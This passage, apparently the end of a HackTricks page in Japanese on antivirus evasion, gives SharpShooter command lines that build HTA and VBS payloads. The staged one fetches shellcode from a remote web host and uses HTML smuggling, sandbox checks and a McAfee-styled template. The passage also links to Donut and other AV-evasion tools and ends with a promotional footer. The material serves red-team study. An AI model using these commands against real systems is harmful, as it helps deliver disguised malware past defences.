SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### もっと

* [https://github.com/persianhydra/Xeexe-TopAntivirusEvasion](https://github.com/persianhydra/Xeexe-TopAntivirusEvasion)

<details>

<summary><strong>htARTE（HackTricks AWS Red Team Expert）</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>でAWSハッキングをゼロからヒーローまで学ぶ</strong></a><strong>！</strong></summary>

HackTricks をサポートする他の方法:

* **HackTricks で企業を宣伝したい** または **HackTricks をPDFでダウンロードしたい場合は** [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) をチェックしてください！
* [**公式PEASS＆HackTricksスウォッグ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)、当社の独占的な [**NFTs**](https://opensea.io/collection/the-peass-family) コレクションを発見する
* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f) または [**telegramグループ**](https://t.me/peass) に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live) をフォローする。
* **ハッキングテクニックを共有するためにPRを** [**HackTricks**](https://github.com/carlospolop/hacktricks) と [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github リポジトリに提出する。

</details>
